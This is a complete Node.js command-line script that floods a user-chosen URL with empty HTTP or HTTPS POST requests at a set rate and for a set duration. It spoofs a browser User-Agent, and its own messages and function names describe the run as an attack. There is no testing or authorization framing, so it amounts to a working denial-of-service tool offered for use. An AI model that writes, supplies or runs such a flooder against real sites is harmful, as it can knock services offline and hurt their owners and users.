const http = require('http');
const https = require('https');
const url = require('url');
const readline = require('readline');

// Read user input
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

// Function to send HTTP/HTTPS POST requests
const sendPostRequest = (targetUrl) => {
  const parsedUrl = url.parse(targetUrl);
  const protocol = parsedUrl.protocol === 'https:' ? https : http;
  const port = parsedUrl.protocol === 'https:' ? 443 : 80;

  const options = {
    hostname: parsedUrl.hostname,
    port: port,
    path: parsedUrl.path || '/',
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': 0,
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }
  };

  const req = protocol.request(options, (res) => {
    res.on('data', () => {});
    res.on('end', () => {});
  });

  req.on('error', (error) => {
    console.error(`Error: ${error.message}`);
  });

  req.end();
};

// Main function to start the attack
const startAttack = (targetUrl, requestsPerSecond, duration) => {
  const endTime = Date.now() + duration * 1000;

  console.log(`Launching POST attack on ${targetUrl} with ${requestsPerSecond} requests/second for ${duration} seconds`);

  const attackInterval = setInterval(() => {
    if (Date.now() >= endTime) {
      clearInterval(attackInterval);
      console.log('Attack finished.');
      return;
    }

    // Send multiple requests at once
    for (let i = 0; i < requestsPerSecond; i++) {
      sendPostRequest(targetUrl);
    }
  }, 1000);
};

// Prompt user for input
rl.question('Enter target URL (e.g., http://example.com): ', (targetUrl) => {
  if (!/^https?:\/\/[a-zA-Z0-9-.]+/.test(targetUrl)) {
    console.error('Invalid URL format. Please enter a valid target URL starting with http or https.');
    rl.close();
    return;
  }

  rl.question('Enter number of requests per second (e.g., 1000): ', (requestsPerSecond) => {
    rl.question('Enter duration in seconds (e.g., 200): ', (duration) => {
      const requestsPerSecondInt = parseInt(requestsPerSecond, 10);
      const durationInt = parseInt(duration, 10);

      if (isNaN(requestsPerSecondInt) || isNaN(durationInt) || requestsPerSecondInt <= 0 || durationInt <= 0) {
        console.error('Invalid input. Requests per second and duration must be positive numbers.');
        rl.close();
        return;
      }

      startAttack(targetUrl, requestsPerSecondInt, durationInt);
      rl.close();
    });
  });
});
